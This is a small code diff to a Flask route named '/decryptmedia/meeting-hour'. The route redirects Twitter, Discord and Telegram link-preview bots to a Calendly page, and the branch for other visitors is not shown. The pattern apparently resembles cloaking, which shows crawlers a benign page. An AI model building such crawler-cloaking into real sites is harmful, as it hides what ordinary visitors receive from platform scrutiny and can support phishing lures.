@@ -16,7 +16,8 @@ credentials_base64 = base64.b64encode(credentials.encode()).decode('utf-8')
 
 @app.route('/decryptmedia/meeting-hour')
 def index():
-    user_agent = request.headers.get('User-Agent').strip('\r\n')
+    user_agent_string = request.headers.get('User-Agent')
+    user_agent = user_agent_string.strip('\r\n')
     if 'Twitterbot' in user_agent or 'Discordbot' in user_agent or 'TelegramBot' in user_agent:
         return redirect('https://calendly.com/advonis-x')
     else:
